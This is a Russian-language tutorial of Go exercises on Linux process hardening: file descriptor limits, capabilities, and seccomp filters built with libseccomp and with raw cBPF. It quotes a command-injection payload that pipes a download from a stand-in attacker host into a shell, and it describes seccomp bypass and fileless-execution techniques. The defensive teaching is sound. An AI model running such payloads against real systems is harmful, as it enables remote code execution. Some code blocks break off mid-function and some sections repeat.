Упражнение #1

Мониторинг лимитов файловых дескрипторов (ulimit) и защита от FD Exhaustion

📌 Условие задачи

Напишите программу, которая при старте опрашивает и логирует лимиты операционной системы Linux на количество открытых файловых дескрипторов с помощью syscall.Getrlimit(syscall.RLIMIT_NOFILE, &limit), а также предпринимает попытку программного повышения мягкого лимита (rlim_cur) до максимального жесткого (rlim_max). Продемонстрируйте проверку текущего количества дескрипторов в процессе через подсчет записей в /proc/self/fd и объясните механику DoS-атак через исчерпание дескрипторов (EMFILE: too many open files).

💡 Теоретический фундамент и концепция

В операционных системах семейства Linux каждое открытое сетевое TCP-соединение, сокет домена Unix, файл на диске, пайп (pipe), таймер (timerfd) и инстанс мультиплексирования (epoll) потребляют ровно один файловый дескриптор (File Descriptor, FD) в таблице дескрипторов процесса.

Механика лимитов RLIMIT_NOFILE:

Ядро Linux отслеживает два уровня ограничений для каждого процесса (структура rlimit):

1. Мягкий лимит (rlim_cur / Soft Limit): Текущее значение ограничения, при превышении которого системные вызовы open, openat, socket, accept4 возвращают фатальную ошибку EMFILE (errno 24: Too many open files). По умолчанию во многих дистрибутивах Linux мягкий лимит составляет скромные 1024 FD!
2. Жесткий лимит (rlim_max / Hard Limit): Верхний потолок, установленный администратором ОС (например, в /etc/security/limits.conf или systemd unit LimitNOFILE=65536). Процесс без привилегии CAP_SYS_RESOURCE может самостоятельно поднять свой мягкий лимит rlim_cur вплоть до жесткого rlim_max, но не выше.
Вектор DoS-атаки (FD Exhaustion):

Если HighLoad Go-сервер запущен со стандартным soft-лимитом 1024 FD, злоумышленнику достаточно открыть всего ~1000 медленных Keep-Alive TCP-соединений. Как только таблица дескрипторов заполняется:

  • Метод net.Listener.Accept() возвращает ошибку accept4: too many open files.
  • Go HTTP-сервер переходит во временный sleep (экспоненциальный бэкофф 5мс..1с), полностью переставая принимать запросы от легитимных клиентов.
  • Любые попытки сервиса открыть соединение к базе данных PostgreSQL или прочитать файл конфигурации приводят к панике или сбою обслуживания.

🔍 Пошаговый ход решения и ход мысли инженера

Импортируйте пакеты golang.org/x/sys/unix (или стандартный syscall), fmt, os и path/filepath.

Объявите структуру var rlim unix.Rlimit и вызовите unix.Getrlimit(unix.RLIMIT_NOFILE, &rlim).

Выведите текущие значения мягкого (rlim.Cur) и жесткого (rlim.Max) лимитов.

Реализуйте функцию EnsureHighLimit(), которая при необходимости повышает rlim.Cur = rlim.Max и применяет изменение через unix.Setrlimit.

Реализуйте функцию CountOpenFDs() (int, error), считывающую количество записей в псевдофайловой системе /proc/self/fd.

Продемонстрируйте работу функций в main() с выводом информативного статуса системы.

📄 main.go 
package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
)

// GetFDLimits считывает мягкий и жесткий лимиты дескрипторов текущего процесса.
func GetFDLimits() (cur, max uint64, err error) {
	var rlim syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlim); err != nil {
		return 0, 0, fmt.Errorf("syscall.Getrlimit failed: %w", err)
	}
	return rlim.Cur, rlim.Max, nil
}

// BoostSoftLimit поднимает rlim_cur до значения rlim_max.
func BoostSoftLimit() error {
	var rlim syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlim); err != nil {
		return err
	}

	if rlim.Cur < rlim.Max {
		oldCur := rlim.Cur
		rlim.Cur = rlim.Max
		if err := syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rlim); err != nil {
			return fmt.Errorf("failed to set rlimit cur to %d: %w", rlim.Max, err)
		}
		log.Printf("[RLIMIT] Мягкий лимит успешно поднят: %d -> %d", oldCur, rlim.Cur)
	} else {
		log.Printf("[RLIMIT] Мягкий лимит уже равен жесткому: %d", rlim.Cur)
	}
	return nil
}

// CountOpenFDs возвращает реальное число занятых файловых дескрипторов.
func CountOpenFDs() (int, error) {
	entries, err := os.ReadDir("/proc/self/fd")
	if err != nil {
		return 0, fmt.Errorf("read /proc/self/fd error: %w", err)
	}
	// Каждая запись в директории /proc/self/fd представляет активный FD
	return len(entries), nil
}

func main() {
	cur, max, err := GetFDLimits()
	if err != nil {
		log.Fatalf("Ошибка чтения ulimit: %v", err)
	}
	fmt.Printf("=== ПРОВЕРКА ЛИМИТОВ СИСТЕМЫ (ULIMIT NOFILE) ===\n")
	fmt.Printf("Текущий мягкий лимит (Cur): %d\n", cur)
	fmt.Printf("Текущий жесткий лимит (Max): %d\n", max)

	// Попытка оптимизации лимитов
	if err := BoostSoftLimit(); err != nil {
		log.Printf("Внимание: не удалось поднять soft limit: %v", err)
	}

	usedFD, err := CountOpenFDs()
	if err != nil {
		log.Printf("Не удалось подсчитать открытые FD: %v", err)
	} else {
		fmt.Printf("Занято дескрипторов процессом прямо сейчас: %d\n", usedFD)
	}
}
⚙️ Под капотом Go (Compiler, Linker & Runtime)

В ядре Linux таблица дескрипторов файла (files_struct) процесса содержит указатели на структуры struct file. При вызове getrlimit(RLIMIT_NOFILE, ...) ядро обращается к массиву current->signal->rlim[RLIMIT_NOFILE]. Константа RLIM_INFINITY обозначает отсутствие верхнего потолка (на 64-битных системах 0xffffffffffffffff). Если при выделении нового дескриптора индекс в битовой маске fdtable превышает rlim[RLIMIT_NOFILE].rlim_cur, вызов аллокации дескриптора немедленно обрывается с возвратом -EMFILE.

⚠️ Частые грабли и ошибки новичков

Поднятие rlim.Cur внутри Go-бинарника ограничено значением rlim.Max. Если системный администратор не сконфигурировал в systemd unit LimitNOFILE=1048576, то rlim.Max в контейнере может быть всего 1024! В таком случае Go-приложение не сможет поднять лимит выше 1024 без ошибки EPERM (Operation not permitted). Всегда проверяйте конфигурацию ulimit в docker-compose (ulimits: nofile: soft: 65536 hard: 65536) или Kubernetes pod security contexts.

🏢 В продакшене BigTech и на собеседованиях

Вопрос с собеседования в Wildberries HighLoad-архитектору: 'Что происходит в Go net.Listener, когда исчерпан лимит файловых дескрипторов (EMFILE)? Падает ли сервис?' Ответ: 'Сервер не падает по панике. В Go runtime в net/http и net пакетах предусмотрен механизм бэкоффа: при получении ошибки EMFILE или ENFILE из accept4(), слушающий цикл переходит в сон через time.Sleep(tempDelay), начиная с 5 мс и удваивая задержку до 1 секунды в надежде, что другие горутины закроют часть соединений. Однако для клиентов сервис выглядит как зависший или сбрасывающий TCP SYN, что приводит к 100% DoS.'

Упражнение #2

Привилегия CAP_NET_BIND_SERVICE: открытие привилегированных портов без root

📌 Условие задачи

Напишите Go-сервер, который пытается слушать привилегированный порт (например, порт 80 или 443). Разберите, почему запуск от имени непривилегированного пользователя приводит к ошибке bind: permission denied. Продемонстрируйте механизм предоставления точечной Linux Capability CAP_NET_BIND_SERVICE бинарному файлу с помощью утилиты setcap, исключающий необходимость запуска сервиса от суперпользователя root.

💡 Теоретический фундамент и концепция

Исторически в Unix-подобных системах порты с номерами от 1 до 1023 называются привилегированными (privileged / well-known ports). Системный вызов bind() для сокетов на этих портах разрешался исключительно суперпользователю root (User ID = 0).

Опасность запуска сервиса под root:

Если запустить Go веб-сервер с правами root на 80 или 443 порту:

  • Любая уязвимость (RCE через уязвимую зависимость, Path Traversal с перезаписью /etc/passwd, чтение закрытых ключей) приводит к полной компрометации всего хоста.
  • Контейнерный побег (Container Escape) при монтировании хостовых сокетов становится тривиальным.
Принцип наименьших привилегий и Linux Capabilities:

Начиная с ядра Linux 2.2, традиционная всемогущая власть root была разделена на десятки независимых дискретных полномочий — Capabilities (см. man 7 capabilities).

  • CAP_NET_BIND_SERVICE: Разрешает процессу привязывать сетевые сокеты к привилегированным портам (< 1024) интернет-домена (AF_INET, AF_INET6).
  • Команда ОС setcap cap_net_bind_service=+ep /path/to/binary устанавливает расширенный атрибут файла (security.capability). Флаги +ep означают:
  • e (Effective): Capability активируется немедленно при старте бинарника.
  • p (Permitted): Процесс имеет право использовать эту capability.

Напишите простой HTTP-сервер на Go, слушающий привилегированный порт :80.

Обработайте ошибку при вызове net.Listen('tcp', ':80').

Проверьте код ошибки: при отсутствии прав ОС вернет ошибку bind: permission denied.

Продемонстрируйте команду назначения Linux Capability: sudo setcap cap_net_bind_service=+ep ./server.

package main

import (
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"syscall"
)

func main() {
	addr := ":80"
	fmt.Printf("[PID %d, UID %d] Попытка привязки к привилегированному порту %s...\n",
		os.Getpid(), os.Getuid(), addr)

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		var opErr *net.OpError
		if errors.As(err, &opErr) {
			var sysErr *os.SyscallError
			if errors.As(opErr.Err, &sysErr) && sysErr.Err == syscall.EACCES {
				log.Fatalf("❌ ОШИБКА ДОСТУПА (EACCES): Недостаточно прав для порта %s.\n"+
					"Решение: выполните 'sudo setcap cap_net_bind_service=+ep %s'\n"+
					"или запускайте на непривилегированном порту (> 1023).", addr, os.Args[0])
			}
		}
		log.Fatalf("Не удалось открыть сокет: %v", err)
	}
	defer ln.Close()

	fmt.Printf("✅ УСПЕХ: Сокет успешно открыт на %s без прав root! CAP_NET_BIND_SERVICE активна.\n", addr)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		fmt.Fprintf(w, "Сервер защищен: запущен от UID %d с CAP_NET_BIND_SERVICE\n", os.Getuid())
	})

	srv := &http.Server{Handler: mux}
	if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
		log.Fatalf("Ошибка сервера: %v", err)
	}
}

SecComp Basics: декларативная фильтрация системных вызовов через libseccomp-golang

📌 Условие задачи

Разработайте Go-программу с использованием пакета github.com/seccomp/libseccomp-golang, которая при старте инициализирует фильтр Seccomp в режиме Whitelist (действие по умолчанию: завершение процесса SIGSYS). Продемонстрируйте, что легитимный вывод в консоль работает, но при попытке вызова os.Open (системный вызов openat) ядро Linux немедленно убивает процесс с сигналом SIGSYS.

💡 Теоретический фундамент и концепция

Seccomp (Secure Computing Mode) — это механизм подсистемы безопасности ядра Linux, появившийся в ядре 2.6.12 и кардинально расширенный в ядре 3.5 (Seccomp-BPF). Он выполняет роль файрвола прикладных системных вызовов (Syscall Firewall).

Философия Whitelist vs Blacklist:
  • Blacklist (Черный список): Блокировать опасные вызовы (execve, ptrace, reboot). Подход фундаментально ущербен: при обновлении ядра появляются новые системные вызовы (например, clone3, openat2, io_uring_enter), через которые злоумышленник обходит запрет.
  • Whitelist (Белый список / Нулевое доверие): Действие по умолчанию — ActKillProcess или ActTrap. Разрешаются только вызовы, внесенные в жесткий перечень. Любой иной сисколл мгновенно уничтожает процесс на уровне ядра ОС до того, как его аргументы будут обработаны!
Архитектура Seccomp:

Фильтр транслируется в байткод классического фильтра пакетов cBPF (classic Berkeley Packet Filter). Ядро проверяет каждый системный вызов процесса в кольце 0. Если номер вызова не совпадает с разрешенным списком, BPF-машина возвращает SECCOMP_RET_KILL_PROCESS (или посылает сигнал SIGSYS потоку).

package main

import (
	"fmt"
	"log"
	"os"

	libseccomp "github.com/seccomp/libseccomp-golang"
)

// InitSeccompWhitelist настраивает строгий белый список системных вызовов.
func InitSeccompWhitelist() error {
	// Действие по умолчанию: мгновенно уничтожить процесс
	filter, err := libseccomp.NewFilter(libseccomp.ActKillProcess)
	if err != nil {
		return fmt.Errorf("NewFilter error: %w", err)
	}

	// Белый список вызовов, жизненно необходимых для консольного вывода и завершения
	allowedSyscalls := []string{
		"write",
		"read",
		"exit",
		"exit_group",
		"rt_sigreturn",
		"futex",
		"mmap",
		"munmap",
		"fstat",
		"getrandom",
	}

	for _, name := range allowedSyscalls {
		sysID, err := libseccomp.GetSyscallFromName(name)
		if err != nil {
			// На некоторых архитектурах сисколл может отсутствовать, пропускаем
			continue
		}
		if err := filter.AddRule(sysID, libseccomp.ActAllow); err != nil {
			return fmt.Errorf("failed to allow %s: %w", name, err)
		}
	}

	// Загрузка фильтра в ядро Linux
	if err := filter.Load(); err != nil {
		return fmt.Errorf("filter.Load failed: %w", err)
	}
	return nil
}

func main() {
	fmt.Println("[INIT] Инициализация безопасного окружения Seccomp...")

	if err := InitSeccompWhitelist(); err != nil {
		log.Fatalf("Ошибка загрузки Seccomp: %v", err)
	}

	fmt.Println("✅ [SECCOMP ACTIVE] Разрешены только write, read, futex и exit.")
	fmt.Println("Попытка открыть файл на диске через os.Open (openat syscall)...")

	// Системный вызов openat ЗАПРЕЩЕН фильтром.
	// Ядро Linux немедленно убьет процесс с сигналом Bad system call (SIGSYS / exit code 159).
	_, err := os.Open("/etc/passwd")
	if err != nil {
		fmt.Printf("Файл не открыт: %v\n", err)
	}

	fmt.Println("Эта строка НИКОГДА не выполнится, так как процесс уничтожен ядром!")
}

При вызове filter.Load() библиотека libseccomp вызывает системный вызов prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0). Это обязательное требование ядра: процесс без флага no_new_privs не может применить seccomp-фильтр без прав CAP_SYS_ADMIN, чтобы исключить эскалацию привилегий через setuid-бинарники. Упражнение #4

Ограничение системных вызовов через SecComp: Предотвращение RCE и шелл-инъекций

📌 Условие задачи

Напишите подробный инженерный анализ и демонстрационный код, показывающий, как ограничение системных вызовов через Seccomp предотвращает эксплуатацию критических уязвимостей удаленного выполнения кода (Remote Code Execution, RCE). Объясните, почему злоумышленник, получивший возможность внедрения команд через уязвимый HTTP-обработчик или десериализатор, оказывается полностью беспомощен, если системный вызов execve заблокирован на уровне ядра.

💡 Теоретический фундамент и концепция

Уязвимости класса RCE (Remote Code Execution) считаются наиболее опасными в веб-сервисах (CVSS score 9.8–10.0). Типичный сценарий атаки:

1. Злоумышленник находит уязвимость (Command Injection в системных утилитах, десериализация небезопасных структур, переполнение буфера в CGO-библиотеке).
2. Эксплойт пытается запустить командный интерпретатор (/bin/sh, /bin/bash) или утилиту загрузки вредоносного ПО (curl, wget) для получения интерактивного шелла (Reverse Shell).
Вектор вызова execve:

На уровне ядра Linux запуск любого нового бинарника или шелла безальтернативно сводится к системным вызовам:

  • execve(pathname, argv, envp) (syscall number 59 на x86_64)
  • execveat(dirfd, pathname, argv, envp, flags) (syscall number 322 на x86_64)

Если профиль Seccomp блокирует execve и execveat, то никакой шелл невозможно породить физически! Даже если шеллкод внедрен в адресное пространство процесса и перехватил управление регистром RIP (Instruction Pointer), попытка выполнить команду syscall с номером 59 приведет к немедленному аппаратному прерыванию ядра и уничтожению процесса-жертвы. Атакующий не сможет ни открыть сокет обратного шелла, ни запустить криптомайнер.

import (
	"fmt"
	"log"
	"os/exec"
	"syscall"

	libseccomp "github.com/seccomp/libseccomp-golang"
)

// ProtectAgainstRCE блокирует любые попытки порождения процессов через execve/execveat.
func ProtectAgainstRCE() error {
	// Создаем фильтр с действием по умолчанию: РАЗРЕШИТЬ ВСЕ
	// (в данном примере изолируем конкретный вектор execve)
	filter, err := libseccomp.NewFilter(libseccomp.ActAllow)
	if err != nil {
		return fmt.Errorf("NewFilter error: %w", err)
	}

	// Список критических сисколлов выполнения внешнего кода
	rceSyscalls := []string{"execve", "execveat"}

	for _, scName := range rceSyscalls {
		sysID, err := libseccomp.GetSyscallFromName(scName)
		if err != nil {
			continue
		}
		// При попытке вызова возвращаем EPERM (Operation not permitted)
		if err := filter.AddRule(sysID, libseccomp.ActErrno.SetReturnCode(int16(syscall.EPERM))); err != nil {
			return fmt.Errorf("failed to block %s: %w", scName, err)
		}
	}

	if err := filter.Load(); err != nil {
		return fmt.Errorf("load seccomp filter error: %w", err)
	}
	return nil
}

func main() {
	fmt.Println("=== ТЕСТИРОВАНИЕ ЭШЕЛОНИРОВАННОЙ ЗАЩИТЫ ОТ RCE ===")

	// 1. Попытка выполнить команду ДО активации защиты
	cmdBefore := exec.Command("uname", "-s")
	out, err := cmdBefore.Output()
	if err != nil {
		log.Fatalf("Ошибка до включения защиты: %v", err)
	}
	fmt.Printf("[ДО ЗАЩИТЫ] Успешный запуск команды uname: %s", string(out))

	// 2. Активация Seccomp-блокировки execve
	if err := ProtectAgainstRCE(); err != nil {
		log.Fatalf("Ошибка установки Seccomp: %v", err)
	}
	fmt.Println("🛡️ Seccomp-фильтр активирован: системные вызовы execve/execveat заблокированы (EPERM).")

	// 3. Симуляция RCE атаки: злоумышленник пытается запустить /bin/sh
	fmt.Println("[АТАКА] Попытка нелегитимного запуска /bin/sh через уязвимый код...")
	cmdAfter := exec.Command("/bin/sh", "-c", "id")
	attackOut, attackErr := cmdAfter.CombinedOutput()
	if attackErr != nil {

⚙️ Под капотом Go (Compiler, Linker & Runtime)

Когда бинарник вызывает exec.Command(), стандартная библиотека Go вызывает forkExec (или clone(SIGCHLD)), создавая дочерний поток/процесс, в контексте которого выполняется системный вызов execve. Поскольку Seccomp-фильтры наследуются при fork и clone (флаг ядра SECCOMP_FILTER_FLAG_TSYNC), дочерний процесс оказывается скован теми же ограничениями. При вызове execve BPF-фильтр немедленно перехватывает управление и возвращает код ошибки -EPERM вместо передачи управления загрузчику ELF-бинарников ядра.

⚠️ Частые грабли и ошибки новичков

Блокировка только execve оставляет открытым execveat (добавлен в Linux 3.19). Опытный атакующий может использовать memfd_create + execveat для бесфайлового исполнения полезной нагрузки (fileless execution). Всегда блокируйте оба системных вызова: и execve, и execveat!

Введение в Seccomp (Secure Computing Mode): Аудит и режим SECCOMP_RET_LOG

📌 Условие задачи

Изучите установку и работу библиотеки github.com/seccomp/libseccomp-golang. Реализуйте конфигурацию Seccomp в режиме аудита (Action SECCOMP_RET_LOG), при котором вызовы не блокируются аварийно, а логируются в auditd / dmesg ядра Linux. Объясните, почему режим логирования является критически важным этапом профилирования перед переводом продакшн-сервиса в жесткий режим блокировки SECCOMP_RET_KILL_PROCESS.

💡 Теоретический фундамент и концепция

Внедрение строгой Seccomp-политики (Default: Kill) в продакшн-окружении сопряжено с колоссальным риском: если инженер забудет хотя бы один системный вызов, используемый стандартной библиотекой Go, сервис упадет с паникой или будет убит ядром прямо под нагрузкой.

Режимы действия Seccomp действий (Action Codes):
1. SECCOMP_RET_KILL_PROCESS (ActKillProcess): Убивает процесс мгновенно. Нулевой шанс компрометации, но максимальный риск отказа в обслуживании при ложных срабатываниях.
2. SECCOMP_RET_ERRNO (ActErrno): Возвращает ошибку (например, EPERM).
3. SECCOMP_RET_LOG (ActLog): Появился в ядре Linux 4.14. Системный вызов разрешается к выполнению, но ядро фиксирует запись в подсистеме аудита Linux (/var/log/audit/audit.log или вывод команды dmesg).
Стратегия безопасного внедрения Seccomp в BigTech:
  • Фаза 1 (Staging / Audit Mode): Приложение запускается с действием по умолчанию ActLog. Сервис прогоняется под полным синтетическим нагрузочным тестированием и end-to-end тестами.
  • Фаза 2 (Анализ логов auditd): С помощью утилит ausearch -m SECCOMP или audit2allow собираются все системные вызовы, попавшие в лог.
  • Фаза 3 (Enforce Mode): Формируется финальный профиль Seccomp, и действие по умолчанию переключается на ActKillProcess.

💡 Теоретический фундамент и концепция

Большинство библиотек для работы с Seccomp (включая libseccomp-golang) зависят от Си-библиотеки libseccomp и требуют включения CGO (CGO_ENABLED=1). В enterprise-разработке на Go это создает проблемы:

  • Усложняется кросс-компиляция (CGO_ENABLED=0 не работает).
  • Увеличивается размер бинарного файла и время сборки.
  • Требуется установка разделяемых библиотек в минималистичный Docker-образ scratch или distroless.
Архитектура cBPF для Seccomp:

На самом низком уровне Seccomp принимает программу на классическом байткоде BPF (classic BPF). Программа представляет собой массив структур sock_filter:

struct sock_filter {
    __u16 code;   // Код инструкции BPF (например, BPF_LD|BPF_W|BPF_ABS)
    __u8  jt;     // Смещение прыжка при True
    __u8  jf;     // Смещение прыжка при False
    __u32 k;      // Аргумент инструкции (номер сисколла или смещение в данных)
};

Данные, передаваемые в BPF-программу при каждом системном вызове, описываются структурой seccomp_data:

  • nr (offset 0): Номер системного вызова.
  • arch (offset 4): Архитектура процессора (например, AUDIT_ARCH_X86_64).
  • instruction_pointer (offset 8): Адрес инструкции syscall.
  • args[6] (offset 16): Шесть 64-битных аргументов вызова.

package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

// Константы cBPF инструкций виртуальной машины BPF
const (
	BPF_LD   = 0x00
	BPF_W    = 0x00
	BPF_ABS  = 0x20
	BPF_JMP  = 0x05
	BPF_JEQ  = 0x10
	BPF_K    = 0x00
	BPF_RET  = 0x06

	// Действия Seccomp
	SECCOMP_RET_ALLOW = 0x7fff0000
	SECCOMP_RET_ERRNO = 0x00050000

	// Смещение поля nr (номер системного вызова) в структуре seccomp_data
	SECCOMP_DATA_NR_OFFSET = 0
)

// InstallPureGoSeccomp загружает cBPF фильтр без использования CGO.
func InstallPureGoSeccomp(blockedSyscall uint32) error {
	// 1. Обязательный флаг NO_NEW_PRIVS (иначе PR_SET_SECCOMP вернет EACCES)
	if err := unix.Prctl(unix.PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); err != nil {
		return fmt.Errorf("prctl(PR_SET_NO_NEW_PRIVS) failed: %w", err)
	}

	// 2. Формируем инструкции виртуальной машины cBPF
	filter := []unix.SockFilter{
		// Шаг 1: Загрузить номер системного вызова в аккумулятор (A = seccomp_data.nr)
		{
			Code: BPF_LD | BPF_W | BPF_ABS,
			K:    SECCOMP_DATA_NR_OFFSET,
		},
		// Шаг 2: Если A == blockedSyscall, прыгнуть на 0 шагов (след. инструкция), иначе прыгнуть на 1 (к ALLOW)
		{
			Code: BPF_JMP | BPF_JEQ | BPF_K,
			Jt:   0,
			Jf:   1,
			K:    blockedSyscall,
		},
		// Шаг 3 (True): Вернуть ошибку EPERM (Operation not permitted)
		{
			Code: BPF_RET | BPF_K,
			K:    SECCOMP_RET_ERRNO | (uint32(syscall.EPERM) & 0x0000ffff),
		},
		// Шаг 4 (False): Разрешить системный вызов
		{
			Code: BPF_RET | BPF_K,
			K:    SECCOMP_RET_ALLOW,
		},
	}

	fprog := unix.SockFprog{
		Len:    uint16(len(filter)),
		Filter: &filter[0],
	}

	// 3. Загружаем фильтр в ядро Linux через prctl
	_, _, errno := unix.Syscall(
		unix.SYS_PRCTL,
		unix.PR_SET_SECCOMP,
		unix.SECCOMP_MODE_FILTER,
		uintptr(unsafe.Pointer(&fprog)),
	)
	if errno != 0 {
		return fmt.Errorf("prctl(PR_SET_SECCOMP) failed: %w", errno)
	}
	return nil
}

func main() {
	fmt.Println("=== PURE GO SECCOMP C-BPF (БЕЗ CGO) ===")

	// Блокируем системный вызов SYS_GETPPID (номер 110 на Linux x86_64)
	targetSyscall := uint32(unix.SYS_GETPPID)
	fmt.Printf("Родительский PID до фильтра: %d\n", unix.Getppid())

	if err := InstallPureGoSeccomp(targetSyscall); err != nil {
		log.Fatalf("Ошибка установки BPF-фильтра: %v", err)
	}
	fmt.Println("🛡️ BPF-фильтр успешно установлен в ядро Linux!")

	// Попытка вызвать заблокированный сисколл
	pid, _, err := unix.Syscall(uintptr(targetSyscall), 0, 0, 0)
	if err != 0 {
		fmt.Printf("✅ ВЫЗОВ SYS_GETPPID УСПЕШНО ЗАБЛОКИРОВАН: error=%v (EPERM)\n", err)
	} else {
		fmt.Printf("Вызов сработал: PID=%d\n", pid)
	}

	// Проверяем, что другие вызовы (например, getpid) по-прежнему работают
	fmt.Printf("Разрешенный вызов SYS_GETPID работает штатно: PID=%d\n", unix.Getpid())
}
⚙️ Под капотом Go (Compiler, Linker & Runtime)

Виртуальная машина cBPF ядра Linux выполняет интерпретацию массива sock_filter. Инструкция BPF_LD | BPF_W | BPF_ABS читает 32-битное слово из контекста системного вызова в регистр-аккумулятор A. Инструкция BPF_JMP | BPF_JEQ | BPF_K сравнивает A с константой K. Поля Jt и Jf содержат относительные смещения прыжка для следующей выполняемой инструкции. Завершается программа инструкцией BPF_RET, возвращающей статус ядру.

⚠️ Частые грабли и ошибки новичков

На 64-битных системах существует режим совместимости x32 ABI, в котором номера системных вызовов сдвинуты (бит __X32_SYSCALL_BIT = 0x40000000). Злоумышленник может вызвать syscall(59 | 0x40000000) и обойти фильтр, если архитектура не валидируется!

💡 Теоретический фундамент и концепция

В архитектуре безопасности Linux системный вызов execve занимает особое место. Это единственный примитив ядра, позволяющий текущему процессу заменить свой образ в памяти на новый исполняемый файл (ELF-бинарник) с сохранением PID.

Смертельный удар по эксплойтам:

Если в веб-приложении найдена уязвимость Command Injection (например, вызов os/exec с неэкранированными данными от пользователя), атакующий отправляет полезную нагрузку вида:

; curl http://attacker.com/malware | sh;

Если в сервисе применен Seccomp-фильтр SECCOMP_RET_KILL_PROCESS для execve:

1. Парсер аргументов Go начинает готовить структуры и переходит к низкоуровневому вызову execve.
2. Ядро Linux в функции seccomp_run_filters() немедленно определяет совпадение с запрещенным правилом.
3. Фильтр возвращает статус SECCOMP_RET_KILL_PROCESS.
4. Ядро мгновенно и безусловно отправляет сигнал SIGSYS (Signal 31) всей группе потоков процесса (task->signal->flags |= SIGNAL_GROUP_EXIT).
5. Процесс погибает в течение наносекунд, ядро генерирует core dump и запись в audit-лог. Атака сорвана, шелл не запущен, данные не скомпрометированы!

Syscall Audit для Go-приложения: Трассировка через strace и построение Whitelist

📌 Условие задачи

Напишите демонстрационный HTTP-сервер на Go и разработайте подробную инструкцию по профилированию его системных вызовов с помощью утилиты strace (флаги -f, -e trace=...). Разберите, почему многопоточный рантайм Go требует обязательного разрешения фундаментальных системных вызовов ядра (futex, clone/clone3, mmap, sigaltstack, epoll_create1, getrandom, rt_sigaction) и как составить исчерпывающий белый список вызовов без риска случайной поломки планировщика GMP или сборщика мусора GC.

💡 Теоретический фундамент и концепция

Язык Go отличается от C или Python тем, что содержит внутри каждого скомпилированного бинарника сложнейший собственный рантайм (Go Runtime), включающий планировщик GMP, аллокатор памяти (mcache/mcentral/mheap), сетевой поллер (Netpoller на базе epoll/kqueue) и трехцветный concurrent Garbage Collector.

Жизненно важные системные вызовы Go Runtime:

При аудите через strace легко заметить системные вызовы, которые программист явно не вызывал в коде, но без которых рантайм Go немедленно разобьется:

1. clone / clone3: Создание новых OS-тредов (M в планировщике GMP) при превышении нагрузки или блокирующих системных вызовах.
2. futex: Основа всех примитивов синхронизации Go (sync.Mutex, sync.RWMutex, каналы chan, планировщик горутин).
3. mmap, munmap, madvise: Аллокация страниц виртуальной памяти для кучи (mheap) и стеков горутин, а также возврат памяти ядру (MADV_DONTNEED / MADV_FREE).
4. epoll_create1, epoll_ctl, epoll_pwait: Движок Go Netpoller для мультиплексирования сокетов.
5. sigaltstack, rt_sigaction, rt_sigprocmask, rt_sigreturn: Обработка сигналов ОС и асинхронное вытеснение горутин (SIGURG в Go 1.14+).
6. getrandom / read из /dev/urandom: Инициализация сидов хэш-мап (runtime.fastrand) и криптографии crypto/rand.

package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func main() {
	log.Printf("[PID %d] Старт HTTP-сервера для аудита системных вызовов...", os.Getpid())

	mux := http.NewServeMux()
	mux.HandleFunc("/api/data", func(w http.ResponseWriter, r *http.Request) {
		// Работа с памятью (аллокация mmap)
		data := make([]byte, 1024*64)
		for i := range data {
			data[i] = byte(i % 256)
		}

		// Системный таймер (futex / nanosleep)
		time.Sleep(2 * time.Millisecond)

		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"ok","allocated_bytes":%d}`, len(data))
	})

	srv := &http.Server{
		Addr:         ":8080",
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
	}

	log.Println("Сервер готов к приему запросов на :8080")
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Ошибка сервера: %v", err)
	}
}

⚙️ Под капотом Go (Compiler, Linker & Runtime)

Утилита strace использует подсистему ядра ptrace (вызов PTRACE_SYSCALL). При каждом входе и выходе из системного вызова ядро останавливает выполнение инспектируемого потока (SIGTRAP), передает управление процессу strace для считывания регистров RAX/ORIG_RAX, а затем возобновляет поток. На архитектуре Linux x86_64 номер сисколла помещается в регистр RAX, а аргументы — в RDI, RSI, RDX, R10, R8, R9.

⚠️ Частые грабли и ошибки новичков

Запуск strace в продакшне под реальной нагрузкой категорически недопустим: перехват каждого сисколла через ptrace замедляет приложение в 10–50 раз (Stop-The-World на каждом переключении контекста ядра). Для продакшн-аудита системных вызовов следует использовать легковесный eBPF (инструменты syscount-bpfcc из пакета bcc-tools или bpftrace), накладные расходы которого составляют менее 1%.

💡 Теоретический фундамент и концепция

В контейнерных средах Docker и Kubernetes механизм Seccomp настраивается декларативно через JSON-манифесты профилей безопасности (Seccomp Security Profiles).

Формат спецификации OCI Seccomp:

Профиль описывает параметры фильтрации для контейнерного рантайма (runc, crun):

  • defaultAction: Базовое действие для всех сисколлов, не попавших в правила. Для Zero Trust систем обязано быть SCMP_ACT_ERRNO (возврат ошибки EPERM) или SCMP_ACT_KILL.
  • architectures: Целевые архитектуры процессора (например, SCMP_ARCH_X86_64, SCMP_ARCH_AARCH64), защищающие от манипуляций с ABI.
  • syscalls: Массив правил, группирующий системные вызовы по действиям (action: "SCMP_ACT_ALLOW") и опциональным проверкам аргументов (args).
Интеграция в Kubernetes:

Начиная с Kubernetes 1.19 (GA в 1.25), Seccomp настраивается прямо в securityContext пода:

securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: profiles/go-microservice.json

Рантайм containerd загружает указанный JSON из каталога /var/lib/kubelet/seccomp/profiles/ и применяет его через BPF в момент инициализации контейнера до передачи управления Go-бинарнику.

⚙️ Под капотом Go (Compiler, Linker & Runtime)

